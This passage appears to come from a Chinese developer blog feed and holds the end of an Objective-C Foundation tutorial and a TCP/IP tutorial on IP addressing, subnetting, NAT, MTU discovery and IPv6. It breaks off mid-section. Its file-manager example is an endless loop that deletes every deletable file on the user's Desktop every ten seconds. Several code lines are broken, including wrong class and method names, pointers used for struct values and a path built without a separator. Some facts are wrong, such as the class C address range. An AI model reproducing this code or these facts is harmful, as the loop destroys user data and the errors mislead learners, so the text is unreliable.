toPath@&quot;xxx&quot; error:nil];</div><div class="line">//移动文件,重命名</div><div class="line">[manager moveItemAtPath:@&quot;xxx&quot; toPath:@&quot;xxx&quot;error:nil];</div><div class="line">//删除文件</div><div class="line">[manager removeItemAtPath:@&quot;xxx&quot; error:nil];</div></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">while(1)&#123;</div><div class="line">	NSFileManager *manager = [NSManager defaultManager];</div><div class="line">	NSString *path = @&quot;/Users/peterpan/Desktop&quot;</div><div class="line">	NSArray *arr = [manager contentsOfFileDirectoryAtPath:path error:nil];</div><div class="line">	if(arr.count &gt; 0)&#123;</div><div class="line">		for(NSString *str in arr)&#123;</div><div class="line">          	NSString *str1 = [NSString stringWithFormat:@&quot;%@%@&quot;, path,str];</div><div class="line">  			if([manager isDeletableFileAtPath:str])</div><div class="line">              [manager removeItemAtPath:str1 error:nil];</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">  NSLog(@&quot;扫描完成&quot;);</div><div class="line">  //CPU暂停指定的时间</div><div class="line">  [NSThread sleepForTimeInterval:10];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="CGPoint"><a href="#CGPoint" class="headerlink" title="CGPoint"></a>CGPoint</h2><p>定义一个变量来保存按钮在iOS界面上的位置，我们需要一个结构体来表示控件在界面上的坐标，就是CGPoint。</p>
<p>CGPoint和NSPoint是同一个结构体，只不过定义了两个名字。</p>
<blockquote>
<p>初始化方式</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//最常用方式</div><div class="line">CGPoint p1 = CGPointMake(20, 30);</div></pre></td></tr></table></figure>
<h2 id="CGSize"><a href="#CGSize" class="headerlink" title="CGSize"></a>CGSize</h2><p>除了一个控件的位置，我们还需要一个结构体变量来保存一个控件的大小，这个变量就是CGSize</p>
<p>NSSize和CGSize也是同一个结构体，只不过定义了两个名称</p>
<blockquote>
<p>初始化方式</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//最常用方式</div><div class="line">CGSize *s1 = CGSizeMake(20,20);</div></pre></td></tr></table></figure>
<h2 id="CGRect"><a href="#CGRect" class="headerlink" title="CGRect"></a>CGRect</h2><p>CGRect同样也是一个结构体，这个结构体变量一般情况下存储一个控件的位置和大小。</p>
<p>NSRect和CGRect同样也是一个结构体，定义了两个名称。</p>
<blockquote>
<p>初始化方式</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//最常用方式</div><div class="line">CGRect *r1 = CGRectMake(10 ,20 ,30 ,40);</div></pre></td></tr></table></figure>
<h2 id="NSValue"><a href="#NSValue" class="headerlink" title="NSValue"></a>NSValue</h2><p>NSValue类是用来包装结构体变量的,就像NSNumber类是用来包装基础数据类型一样，因为结构体变量是无法直接写入到数组中的，只有OC对象可以。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">CGPoint *p1 = CGPointMake(20, 30);</div><div class="line">//下面代码还可以改成valueWithSize等等结构体</div><div class="line">NSValue *v1 = [NSValue valueWithPoint:p1];</div><div class="line">//v1的属性都存放在sizeValue之中</div><div class="line">NSLog(@&quot;%@&quot;, NSStringFromPoint(v1.sizeValue));</div></pre></td></tr></table></figure>
<h2 id="字符串和日期转换"><a href="#字符串和日期转换" class="headerlink" title="字符串和日期转换"></a>字符串和日期转换</h2><p>可以得到当前时间，创建一个NSDate对象即可，将这个对象输出就是当前系统的格林威治时间，如果要格式化输出日期，就要采取下面方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">NSDate *date = [NSDate new];</div><div class="line">NSDateFormatter *formatter = [NSDateFormatter new];</div><div class="line">//代表显示年月日十分秒</div><div class="line">formatter.dateFormat = @&quot;yyyy-MM-dd HH:mm:ss&quot;;</div><div class="line">NSString *str = [formatter stringFromDate:date];</div><div class="line">//这样输出的就是当前时区的格式化时间,可以在时间之间随意的添加自定义的效果,e.g-&gt;yyyy年MM月dd日</div><div class="line">NSLog(@&quot;%@&quot;, str);</div></pre></td></tr></table></figure>
<p>将字符串转换为时间</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">NSString *str = @&quot;2016-09-27 12:12:12&quot;;</div><div class="line">NSDateFormatter *formatter = [NSDateFormatter new];</div><div class="line">formatter.dateFormat = @&quot;yyyy-MM-dd HH:mm:ss&quot;;</div><div class="line">NSDate *date = [formatter dateFromString:str];</div></pre></td></tr></table></figure>
<h2 id="日期计算"><a href="#日期计算" class="headerlink" title="日期计算"></a>日期计算</h2><p>在当前基础上，新增一个指定的时间，得到一个新的时间</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//获取的默认是零时区的时间，到东八区的时间就是加八个小时</div><div class="line">NSDate *date = [NSDate dateWithTimeIntervalSinceNow:5000];</div><div class="line">//求两个时间之差</div><div class="line">NSDate *date1 = [NSDate new];</div><div class="line">NSDate *date2 = [NSDate new];</div><div class="line">double res = [date1 timeIntervalSinceDate:date2];</div></pre></td></tr></table></figure>
<h2 id="得到日期对象的各个部分"><a href="#得到日期对象的各个部分" class="headerlink" title="得到日期对象的各个部分"></a>得到日期对象的各个部分</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">NSDate *date = [NSDate date];</div><div class="line">//创建一个日历对象，可以从日历对象中取到日期的各个部分</div><div class="line">NSCalendar *calendar = [NSCalendar currentCalendar];</div><div class="line">NSDateComponents *com = [calendar components:NSCalendarUnitYear fromDate:date];</div><div class="line">//可以直接使用成员运算符取出日期对象的各个部分</div><div class="line">NSLog(@&quot;%lu&quot;, com.year);</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 核心三大库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iOS开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[TCP/IP(三)]]></title>
      <url>/2017/09/03/TCP-IP-%E4%B8%89/</url>
      <content type="html"><![CDATA[<p>接着上一节说的OSI七层模型中传输的过程，这一次我们来了解一下IP协议（不讲数据链路）</p>
<a id="more"></a>
<h1 id="TCP-IP-三"><a href="#TCP-IP-三" class="headerlink" title="TCP/IP(三)"></a>TCP/IP(三)</h1><h2 id="IP即网际协议"><a href="#IP即网际协议" class="headerlink" title="IP即网际协议"></a>IP即网际协议</h2><h3 id="IP初探"><a href="#IP初探" class="headerlink" title="IP初探"></a>IP初探</h3><p>TCP/IP的心脏是网络层，这一层主要由IP和ICMP两个协议组成，鉴于目前的IP协议已经无法满足互联网的需求，所以出现了更高级的IP协议（也就是IPv6协议）。</p>
<p>IP协议处于OSI模型中的网络层，网络层的主要作用是实现端对端之间的通信，而它的上一层数据链路层是用来实现同一种数据链路相连的节点之间通信，如果是要在不同的数据节点之间进行通信，就必须要经过网络层，下面用一张图作例子：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/9868C928C25D057A6E967EC5A49BADF1.png" alt="9868C928C25D057A6E967EC5A49BADF1.png" title="" class="">
                <p>9868C928C25D057A6E967EC5A49BADF1.png</p>
            </figure>
<p>Tips:在这里补充一下节点和主机的联系，一般我们将配有IP地址但不进行路由控制的设备称作主机，两者都有的称作路由器，而这两个又统称为节点。</p>
<h3 id="网络层与数据链路层的关系"><a href="#网络层与数据链路层的关系" class="headerlink" title="网络层与数据链路层的关系"></a>网络层与数据链路层的关系</h3><p>数据链路层提供直连两个设备之间的通信功能,而网络层是负责在没有直连的两个网络之间进行数据传输。那么为什么一定需要这样的两个网络层次呢？</p>
<p>我们可以通过一个简单的例子来说明这个问题。比如说有一个从湖南出发，要去西双版纳。但是碍于路途遥远，它需要乘坐飞机，火车再转大巴才能到达目的地。</p>
<p>那么整个行程中，这个人需要的东西有两个：行程表和车票。</p>
<p>1.行程表：作用相当于网络层，有出发地址和目标地址还有之间经过的地方（路由控制表决定）</p>
<p>2.车票：作用相当于数据链路层，因为每张票只能让这个人通过一部分的路程（一个数据链路）</p>
<p>所以从这个角度来说，网络层和数据链路层都是必须的，就像人需要行程表和每张车票一样。</p>
<h2 id="IP基础知识"><a href="#IP基础知识" class="headerlink" title="IP基础知识"></a>IP基础知识</h2><h3 id="路由控制"><a href="#路由控制" class="headerlink" title="路由控制"></a>路由控制</h3><ul>
<li>作用</li>
</ul>
<p>路由控制是指将分组数据发送到最终目标地址的功能。即使网络非常复杂，也可以通过路由控制确定到达目标地址的通路。一旦这个路由控制的运行出现了异常，那么分组数据极有可能”迷失”</p>
<ul>
<li>发送数据到最终目标地址</li>
</ul>
<p>Hop(中文意思是跳)指的是网络的一个区间。IP包正是在网络中的一个跳间被转发。因此IP路由也被称作多跳路由。在每一个区间决定着包在下一跳被转发的路径。</p>
<p>一跳是指它是从主机或者路由器不经过路由器能直接到达的相邻主机或路由器网卡之间的一个区间。在这一跳的区间，电缆可以通过网桥或者交换集线器相连，不会通过路由器或网关相连。</p>
<p>那么这个时候再来说一下多跳路由就比较方便理解了，多跳路由指的就是路由器或主机在转发IP包的时候只会指定下一步的路由器或主机，而不是将到最终目标地址为止的所有通路全都指定出来。因为每一跳在转发IP数据包时会分别指定下一跳的操作，直至到达最终地址的操作。</p>
<p>同样也根据前面那个旅游作例子，一个人从湖南去云南，此时他没有一张完整的行程图</p>
<p>1.从湖南站到达昆明站(路由器)，向车站工作人员(路由控制表)询问，车站人员说转乘火车去大理，在咨询一下那里的人</p>
<p>2.来到另一个车站，另一个车站的工作人员说去转乘汽车去香格里拉，在咨询那里的人…</p>
<p>3.在辗转了多次了之后，终于到达了我们的目标节点。</p>
<p>为了将数据包发送给目标主机，所有主机都维护着一张路由控制表。该表记录IP数据在下一步应该发送给哪一个路由器，IP包就是根据这个在各个数据链路传输。</p>
<ul>
<li>Tips</li>
</ul>
<p>IP协议属于面向无连接型的协议，IP采用面向无连接主要有两点原因：一是为了简化，而是为了提速。在建立连接断开连接的过程中会降低处理的速度，这样的功能可以交给上一层协议来完成，由TCP来提高通信的可靠性。可能会有人问，为什么不让IP协议和TCP协议合并，这就在于如果让一个协议规定多个功能，协议的具体实施和编程就会变的复杂，就像我们在写程序的时候都会尽量的去做到功能单一化，方便排错。</p>
<h2 id="IP地址基础知识"><a href="#IP地址基础知识" class="headerlink" title="IP地址基础知识"></a>IP地址基础知识</h2><h3 id="IP地址的分类"><a href="#IP地址的分类" class="headerlink" title="IP地址的分类"></a>IP地址的分类</h3><p>IP地址分为四个级别，分别为A类，B类，C类，D类。它根据IP地址中从第一位到第四位的比特列对其网络标识和主机标识进行区分。</p>
<ul>
<li>A类IP地址首位以”0”开头，从第一位到第八位是网络标识，也就是从0.0.0.0～127.0.0.0</li>
<li>B类前两位是”10”,从1-16位是网络标识，也就是128.0.0.0～191.255.0.0。</li>
<li>C类IP地址是前三位为”110”的地址。从第一位到第二十四位是网络标识，也就是192.0.0.0～239.255.255.0</li>
<li>D类地址是前四位为”1110”的地址。从第一位到第三十二位都是网络标识，没有主机标识，常被用作多播</li>
</ul>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E4%B8%8B%E8%BD%BD.jpeg" alt="下载.jpeg" title="" class="">
                <p>下载.jpeg</p>
            </figure>
<p>Tips:在分配IP地址的时候关于<strong>主机标识</strong>有一点需要注意。即要使用比特位表示主机地址时，不可以全部为0或全部为1。因为全部为0表示对应的网络地址不可获知，而全部为1的主机地址通常作为广播地址。</p>
<h3 id="广播和多播"><a href="#广播和多播" class="headerlink" title="广播和多播"></a>广播和多播</h3><p>将IP地址中的主机地址部分全部设置为1，就成为了广播地址。如172.16.0.0/16将主机部分修改为1就成为了172.16.255.255。</p>
<ul>
<li>两种广播</li>
</ul>
<p>广播分为本地广播和直接广播两种</p>
<p>在本网络内的广播叫做本地广播，例如网络地址为192.168.0.0/24，广播地址为192.168.0.255.因为这个广播地址的IP包会被路由器屏蔽，所以不会到达192.168.0.0/24以外的其他链路上。</p>
<p>在不同网络之间的广播叫作直接广播。例如网络地址为192.168.0.0/24的主机向192.168.1.255/24    的目标地址发送IP包。收到这个包的路由器就会将数据转发给192.168.1.0/24，使这个数据链路上的所有主机都能收到这个包。</p>
<ul>
<li>IP多播</li>
</ul>
<p>多播用于将包发送给组内特定的主机，因为随着多媒体应用的发展，对于向多台主机同时发送数据包，在效率上的要求需要提高。人们一直使用广播的方式，将数据发送给所有的终端主机，再由这些主机IP上一层去判断是否接受，对那些无关的主机造成了影响，而且造成流量损失。</p>
<p>多播不仅可以实现1对N，N对N通信，还可以穿透路由器，成为了我们的首选。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/87F25A0FF68DC378B41BBCCA8356DCB5.png" alt="87F25A0FF68DC378B41BBCCA8356DCB5.png" title="" class="">
                <p>87F25A0FF68DC378B41BBCCA8356DCB5.png</p>
            </figure>
<p>多播使用D类地址，前四位是”1110”，后28位可以成为多播的组编号，多播的更多细节可以参考<a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E6%92%AD" target="_blank" rel="external">维基百科</a></p>
<h3 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h3><p>一个IP地址只要确定了他的分类，也就确定了他的网络标识和主机标识。网络标识相同的计算机必须属于同一个链路。例如，架构B类IP网路的时候，理论上一个链路内允许6万多台计算机连接，但是实际上，是不会有一个链路上连接这么多台计算机的情况的。</p>
<p>所以当我们直接使用A类，B类网的时候，随着互联网的增大，事实上是相当的浪费的，所以有一种新的组合方式来减少这种浪费。</p>
<ul>
<li>子网和子网掩码</li>
</ul>
<p>现在一个IP地址的网络和主机标识不再受限于该地址的类别，而是由一个叫做”子网掩码”的识别码通过子网网络地址细分出比A、B、C、D类更小的网络。 </p>
<p>自从引入了子网之后，一个IP地址就拥有了两种识别码。一个是IP地址本身，另一个就是子网掩码，用二进制表示话也是一个32位的数字，它对应的网络标识位全为1，主机标识位全为0。所以自此以后，一个IP不必在首先与网络的类型，而是可以自由的定位自己的网络标识长度。</p>
<table>
<thead>
<tr>
<th>IP地址</th>
<th>172.20.100.52</th>
</tr>
</thead>
<tbody>
<tr>
<td>子网掩码</td>
<td>255.255.255.192</td>
</tr>
<tr>
<td>网络地址</td>
<td>172.20.100.0</td>
</tr>
<tr>
<td>广播地址</td>
<td>172.20.100.63</td>
</tr>
</tbody>
</table>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/C357D54BE16FA2D3D8AEA0F923C958BF.png" alt="C357D54BE16FA2D3D8AEA0F923C958BF.png" title="" class="">
                <p>C357D54BE16FA2D3D8AEA0F923C958BF.png</p>
            </figure>
<h3 id="CIDR和VLSM"><a href="#CIDR和VLSM" class="headerlink" title="CIDR和VLSM"></a>CIDR和VLSM</h3><p>正如前面所说，人们逐渐放弃了IP地址的分类，而是采用任意长度分割IP地址的网络标识和主机标识。这种方式叫做CIDR，意为无间隙域间选路。由于BGP对应了CIDR，所有不受IP地址分类的限制自由分类。</p>
<p>根据CIDR，就可以将连续多个C类地址划分到一个较大的网络中，有效利用IPv4地址，通过路由集中降低路由器的负担。以下面一张图为例子：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/7D3BB828435CFFD1C9A90EECB73F5792.png" alt="7D3BB828435CFFD1C9A90EECB73F5792.png" title="" class="">
                <p>7D3BB828435CFFD1C9A90EECB73F5792.png</p>
            </figure>
<p>至于VSLM，是为了可以随机修改组织内各个部门的子网掩码长度的机制。它可以通过域间路由协议转换为RIP2以及OSPF实现，它可以提高IP地址的利用率。</p>
<p>举个例子就是一个公司有五个部门，各个部门的PC数量为100/50/10/10/10，公司的公网IP为199.1.1.0/24</p>
<p>199.1.1.0/24取该地址和掩码的二进制数分别为：</p>
<blockquote>
<p>11000111.00000001.00000001.00000000</p>
<p>11111111.11111111.11111111.00000000</p>
</blockquote>
<p>1.100大于2的6次方而小于2的7次方，故如下：</p>
<blockquote>
<p>11000111.00000001.00000001.0|0000000</p>
<p>11111111.11111111.11111111.0|0000000</p>
</blockquote>
<p>网络位向主机位借一位，故有如下两个情况：</p>
<blockquote>
<p>11000111.00000001.00000001.0|0000000                     199.1.1.0/25 （100台PC部门用此网络）11000111.00000001.00000001.1|0000000                     199.1.1.128/25</p>
</blockquote>
<p>2.50与2的6次方64接近，满足其应用。故向主机位再借一位有如下：</p>
<p>199.1.1.128/25取其二进制11000111.00000001.00000001.10000000有：</p>
<blockquote>
<p>11000111.00000001.00000001.1|0|000000           199.1.1.128/26（50台PC部门用此网络） 11000111.00000001.00000001.1|1|000000          199.1.1.192/26</p>
</blockquote>
<p>3.三个10台PC的部门的网络应用，因10与2的4次方接近，故地址199.1.1.192/26我们要再向主机位借2位，如下：</p>
<p>199.1.1.192/26的二进制11000111.00000001.00000001.11000000  划分如下：</p>
<blockquote>
<p>11000111.00000001.00000001.1|1|00|0000               199.1.1.192/2811000111.00000001.00000001.1|1|01|0000               199.1.1.208/2811000111.00000001.00000001.1|1|10|0000               199.1.1.224/2811000111.00000001.00000001.1|1|11|0000               199.1.1.240/28</p>
</blockquote>
<p>三个10台PC的部门在以上四个网络中任意选取三个，余的一个留作备用或再进行划分应用在网络设备的点对点的IP的配置上。</p>
<h3 id="全局地址和私有地址"><a href="#全局地址和私有地址" class="headerlink" title="全局地址和私有地址"></a>全局地址和私有地址</h3><p>起初的时候，互联网中的每一台电脑都需要配有唯一的IP地址。一旦出现IP地址冲突，就会导致发送端无法判断到底应该发给哪个地址。但是随着IP地址越来越少，如果还是按照这样的方法，IP地址就会有耗尽的危险。所以就出现了一种新的技术，不要求为每一台主机或路由器分配IP，只需要在必要的时候为相应的设备分配唯一的IP。</p>
<p>对于那些没有连接互联网的独立网络中的主机，只需要保证在这个网络内的地址唯一即可，也就是私有IP，他的规范如下：</p>
<blockquote>
<p>10.0.0.0～10.255.255.255 （10/8）A类</p>
<p>172.16.0.0～172.31.255.255 （172.16/12）B类</p>
<p>192.168.0.0～192.168.255.255 （192.168/16） C类</p>
</blockquote>
<p>在这之外的一般称作全局IP，私有IP在一开始的时候没有打算要联网，在能交换私有IP和全局IP的NAT技术出现之后，配有私有IP的主机才能和配有全局IP的主机进行通信。</p>
<p>因为全局IP要求保持全球内的唯一，但是私有地址不需要，只需要在同一个域内保持唯一即可。不同域内的私有IP相同不会影响使用。</p>
<p>当下学校、医院等地方的IP地址分配都是用私有IP结合NAT技术使用，尽管如此，和全局IP比还是有一些限制，但由于IPv6没有得到普及，IPv4又快耗尽，所以NAT配上私有IP也是互联网的现状。</p>
<p>那么这个NAT技术的本质到底是什么呢？今天介绍NAT的一种，也就是端口映射，它将外网主机的 IP 地址的一个端口映射到内网中一台机器，提供相应的服务。当用户访问该 IP 的这个端口时，服务器自动将请求映射到对应局域网内部的机器上。</p>
<p>我们平时经过路由器，通过宽带，最终去到运营商那边，数据是从运营商出去，最终数据是回到运营商那边，运营商再把数据发送到用户的电脑。</p>
<ul>
<li>路由器，至少有两个端口：WAN 口和 LAN 口。</li>
<li>WAN：接外部 IP 地址用，通常指的是出口，转发来自内部 LAN 接口的 IP 数据包，这个口的 IP 是唯一的。</li>
<li>LAN：接内部 IP 地址用，LAN 内部是交换机。</li>
</ul>
<p>这里，我们简化这个过程，我们把运营商当做一个 NAT 设备。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-23%20%E4%B8%8A%E5%8D%8810.13.58.png" alt="屏幕快照 2018-01-23 上午10.13.58.png" title="" class="">
                <p>屏幕快照 2018-01-23 上午10.13.58.png</p>
            </figure>
<p>通过这样的层层端口映射，最终保证地址(IP + 端口)的唯一性。A 和 B 访问百度服务器，尽管它们的局域网 IP 是一样的，但是最终它们访问百度的地址(IP + 端口)是唯一的，所以，百度服务器回复时，原路返回时能够区分到底给谁回。</p>
<p>Tips：为了安全问题，我们必须通过IP地址和主机找到管理人，可以使用<code>whois</code>命令来查看IP来源</p>
<h3 id="路由控制-1"><a href="#路由控制-1" class="headerlink" title="路由控制"></a>路由控制</h3><p>在前面我们了解路由控制的基本之后，现在我们再来看看路由控制表是如何形成的呢？</p>
<p>路由表的形成方式有两种，一种是管理员手动设置，叫做静态路由控制，还有一种是路由器和其他路由器相互交换信息的时候自动刷新，叫做动态路由控制。为了让动态路由及时刷新路由表，在网络互连的路由器之间都必须设置好路由协议，保证正常的读取路由控制信息。这个表是根据路由协议制作而成的。</p>
<p>发送IP包的时候，首先要确定IP包首部中的目标地址，根据该记录转发给下一个路由器。当然也会出现路由控制表中存在多条相同网络地址的记录,这时候选择相同位数最长的：</p>
<p>比如172.20.100.52的网络地址与172.20.100/24和172.20/16网络地址相同，这时候选择前者。话不多说，直接上图方便理解：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/11CB028F403A47C3FB4083FFB89D8CF2.png" alt="11CB028F403A47C3FB4083FFB89D8CF2.png" title="" class="">
                <p>11CB028F403A47C3FB4083FFB89D8CF2.png</p>
            </figure>
<h2 id="IP分割与再构成处理"><a href="#IP分割与再构成处理" class="headerlink" title="IP分割与再构成处理"></a>IP分割与再构成处理</h2><h3 id="IP报文分片与重组"><a href="#IP报文分片与重组" class="headerlink" title="IP报文分片与重组"></a>IP报文分片与重组</h3><p>因为每种数据链路的最大传输单元（MTU）都不尽相同。因为每种数据链路的使用目的不同，可承载的MTU自然也就不同了。</p>
<p>任何一台主机都有必要对IP包进行分片的处理，往往是因为碰到较大的报文无法一次发出去。因为IP包的大小超过了MTU，所以需要将IP数据包划分成若干个片段进行传输，这种操作只要路由器认为有必要，就会周而复始地进行。</p>
<p>经过分片之后的IP数据报只会由目标主机重组，因为无法保证IP数据报是否通过同一个路径传送。此外，经过下一站的时候需不需要重新再分片，所以如果每一次重新组装就会加重路由器的负担。</p>
<h3 id="路径MTU发现"><a href="#路径MTU发现" class="headerlink" title="路径MTU发现"></a>路径MTU发现</h3><p>同时分片机制也有它的不足。首先这会加重路由器的负担，因为现下路由器需要做的其他处理越来越多，如果网络过滤(指带有一定参数的IP数据报才能通过路由器)等，所以不希望让路由器去做IP分片的工作。</p>
<p>其次，在分片的处理中，只要丢失一个分片，整个IP数据报都会废掉。所以为了应对这种情况，出现了一种新的技术叫做路径MTU发现。路径MTU是指从发送端到接收端主机之间不需要分片的最大MTU大小，也就是途中经过的数据链路中最小的MTU。而路径MTU发现就是根据这个路径MTU的大小从发送主机将IP数据报分片之后进行传输。</p>
<p>这样一来，不仅可以避免路由器上进行分片处理，还可以在TCP中发送更大的包。</p>
<h3 id="路径MTU工作原理"><a href="#路径MTU工作原理" class="headerlink" title="路径MTU工作原理"></a>路径MTU工作原理</h3><p>首先将发送端主机发送IP数据报的时候将其首部的禁止标志位设为1。根据这个标志位，图中的路由器即使遇到分片才能处理的大包也不会进行分片，而是丢弃。然后通过一个ICMP的不可达消息将该数据链路的MTU发送给发送端主机。</p>
<p>发送端主机获取了这个MTU值之后，将其设置为当前的MTU值，根据这个MTU值进行分片处理。然后再次发送IP数据报，如此循环往复，直到被发送到目标主机没有再受到任何的ICMP，就认为最后一次通知的MTU值是一个合适的MTU值，当然这个值也有一个缓存的时间，过了之后就要根据链路上的MTU重新做一次路径MTU发现。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/5B393B9F59B4BD914AE16343323387FE.png" alt="5B393B9F59B4BD914AE16343323387FE.png" title="" class="">
                <p>5B393B9F59B4BD914AE16343323387FE.png</p>
            </figure>
<p>上图中是UDP的例子，如果是TCP的话，会根据路径MTU计算出最大段的长度(MSS)，根据这个信息再进行数据报的发送，IP层则不会再进行分片处理，而且到达目标端在IP层也不需要重组，直接发送给目标主机的TCP层：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/358886AC7DEC0B850831B644FAC15141.png" alt="358886AC7DEC0B850831B644FAC15141.png" title="" class="">
                <p>358886AC7DEC0B850831B644FAC15141.png</p>
            </figure>
<h2 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h2><h3 id="IPv6特点"><a href="#IPv6特点" class="headerlink" title="IPv6特点"></a>IPv6特点</h3><p>IPv6是为了从根本解决IPv4地址耗尽而被标准化的一种网际协议，IPv4长度是32位，IPv6则是128位，一般写成8个16位的格式。IPv6不仅可以解决IPv4地址被耗尽的问题，还可以弥补一些在IPv4中缺陷，因为有些功能在IPv4中并未完全实现，需要管理员介入或者根本无法实现，而这些在IPv6中都作为了必要功能：</p>
<ul>
<li>IP地址扩大和路由控制表聚合</li>
</ul>
<p>IP地址依然适应互联网分层结构，分配与其结构相适应的IP地址，避免路由表膨大，而且IPv6地址可以表示的数字高达38位数（2的128次方约为3.4e+38）。足以为人们想到的所有主机的路由器分配IP地址。</p>
<ul>
<li>性能提升</li>
</ul>
<p>包首部长度采用固定的值（40字节），不再采用首部校验码。简化首部的结构，减轻了路由器的负荷。路由器也不在做分片处理（通过路径MTU发现）</p>
<ul>
<li>支持即插即用</li>
</ul>
<p>即使没有DHCP服务器也可以实现自动分配IP地址</p>
<ul>
<li>采用认证和加密功能</li>
</ul>
<p>应对伪造IP地址的网络安全功能以及防止线路窃听的功能</p>
<ul>
<li>多播、Mobile IP成为扩展功能</li>
</ul>
<p>被定义为IPv6的扩展功能。由此可见，在IPv4中难以应用的和两个功能在IPv6中能够顺利使用</p>
<h3 id="IPv6地址结构"><a href="#IPv6地址结构" class="headerlink" title="IPv6地址结构"></a>IPv6地址结构</h3><p>IPv6地址因为太长，所以就算以十进制数来表示的时候还是不方便，所以采用的是十六进制</p>
<p>如FEDC:BA98:7654:3210:FEDC:BA98:7654:3210，每组用冒号隔开，如果中间有连续的0可以用两个连续的冒号来替代，但是一个IP地址中只允许出现一次两个连续的冒号。</p>
<p>接下来再说一下IPv6中的一些地址的结构：</p>
<h4 id="全局单播地址"><a href="#全局单播地址" class="headerlink" title="全局单播地址"></a>全局单播地址</h4><p>全局单播地址是互联网通信和各个域内部通信最常用的一个IPv6地址，格式如下：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/EF5E051776872AA6E25EF5A4AC10A12E.png" alt="EF5E051776872AA6E25EF5A4AC10A12E.png" title="" class="">
                <p>EF5E051776872AA6E25EF5A4AC10A12E.png</p>
            </figure>
<p>现在的IPv6网络中所用的格式，n=48,m=16，即前64位是网络标识，后六十四位是主机标识。</p>
<p>通常接口ID中保存的是64比特版的MAC地址值，但是有时不想让对端知道这种设备固有的属性，所以就可以在接口ID设置一个随机产生，定时更新的与MAC地址没有关系的”临时地址”。这个由操作系统的具体装置来决定。</p>
<h4 id="链路单播地址"><a href="#链路单播地址" class="headerlink" title="链路单播地址"></a>链路单播地址</h4><p>链路单播地址是指在同一个数据链路内唯一的IP地址。用于不经过路由器，在同一个链路中的通信。通常接口ID保存64位的MAC地址：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/1FFD2B3F7FB03C2172E51E954D3CE88A.png" alt="1FFD2B3F7FB03C2172E51E954D3CE88A.png" title="" class="">
                <p>1FFD2B3F7FB03C2172E51E954D3CE88A.png</p>
            </figure>
<p>举个简单的例子就是一个企业内市场部内部之间交流用的链路单播地址。</p>
<h4 id="唯一本地地址"><a href="#唯一本地地址" class="headerlink" title="唯一本地地址"></a>唯一本地地址</h4><p>唯一本地地址是不进行互联网通信的时候所使用的地址，设备控制的限制型网络和一些核心网会和互联网隔离，这些企业在和互联网通信的时候通常会使用NAT以及代理联网。唯一本地地址就是在这种不联网或者通过NAT或者代理上网的环境下准备的。</p>
<p>虽然唯一本地地址不会连接互联网，但是还是需要分配一个全局ID，这是为了在用唯一本地地址进行网络连接的时候人们可以不改动IP地址实现网络统一。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/D3D6F10A4F65BC720EB725BDD44D71C6.png" alt="D3D6F10A4F65BC720EB725BDD44D71C6.png" title="" class="">
                <p>D3D6F10A4F65BC720EB725BDD44D71C6.png</p>
            </figure>
<p>举个例子就是在企业内市场部和营销部之间通信用的是唯一本地地址，有点类似于IPv4的私有地址。</p>
<h2 id="IPv4、IPv6首部"><a href="#IPv4、IPv6首部" class="headerlink" title="IPv4、IPv6首部"></a>IPv4、IPv6首部</h2><h3 id="IPv4"><a href="#IPv4" class="headerlink" title="IPv4"></a>IPv4</h3><p>从之前的知识我们了解到IP数据包的首部包含了源地址和目标地址的信息，那么其中还包含了什么呢？</p>
<figure class="image-box">
